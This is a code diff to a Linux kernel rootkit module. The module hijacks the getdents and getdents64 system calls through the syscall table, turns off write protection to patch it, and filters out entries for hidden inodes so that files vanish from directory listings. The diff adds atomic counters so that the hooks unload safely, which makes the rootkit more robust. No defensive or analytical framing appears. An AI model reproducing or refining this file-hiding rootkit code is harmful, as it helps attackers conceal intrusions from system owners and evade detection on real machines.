@@ -13,6 +13,8 @@
 extern rootkit_t rootkit;
 
 void **sys_calls;
+atomic_t getdents_count;
+atomic_t getdents64_count;
 
 asmlinkage long (*sys_getdents)(const struct pt_regs *);
 asmlinkage long (*sys_getdents64)(const struct pt_regs *);
@@ -34,7 +36,10 @@ retrieve_sys_call_table(void)
 void
 init_hooks(void)
 {
+    atomic_set(&getdents_count, 0);
     sys_getdents = (void *)sys_calls[__NR_getdents];
+
+    atomic_set(&getdents64_count, 0);
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
 }
 
@@ -42,8 +47,13 @@ void
 remove_hooks(void)
 {
     if (rootkit.hiding_files) {
+        while (atomic_read(&getdents_count) > 0);
         disable_protection();
         sys_calls[__NR_getdents] = (void *)sys_getdents;
+        enable_protection();
+
+        while (atomic_read(&getdents64_count) > 0);
+        disable_protection();
         sys_calls[__NR_getdents64] = (void *)sys_getdents64;
         enable_protection();
     }
@@ -85,12 +95,14 @@ g7_getdents(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
+    atomic_inc(&getdents_count);
+
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
     kdirent_inode = kdirent_dentry->d_inode;
 
     inode_list_t hidden_inodes = { 0, NULL };
-    inode_list_t_ptr hi_head = &hidden_inodes;
-    inode_list_t_ptr hi_tail = &hidden_inodes;
+    inode_list_t_ptr hi_head, hi_tail;
+    hi_head = hi_tail = &hidden_inodes;
 
     struct list_head *i;
     list_for_each(i, &kdirent_dentry->d_subdirs) {
@@ -119,6 +131,7 @@ g7_getdents(const struct pt_regs *pt_regs)
     }
 
     copy_to_user(dirent, kdirent, ret);
+    atomic_dec(&getdents_count);
 
 yield:
     kfree(kdirent);
@@ -148,12 +161,14 @@ g7_getdents64(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
+    atomic_inc(&getdents64_count);
+
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
     kdirent_inode = kdirent_dentry->d_inode;
 
     inode_list_t hidden_inodes = { 0, NULL };
-    inode_list_t_ptr hi_head = &hidden_inodes;
-    inode_list_t_ptr hi_tail = &hidden_inodes;
+    inode_list_t_ptr hi_head, hi_tail;
+    hi_head = hi_tail = &hidden_inodes;
 
     struct list_head *i;
     list_for_each(i, &kdirent_dentry->d_subdirs) {
@@ -182,6 +197,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     }
 
     copy_to_user(dirent, kdirent, ret);
+    atomic_dec(&getdents64_count);
 
 yield:
     kfree(kdirent);
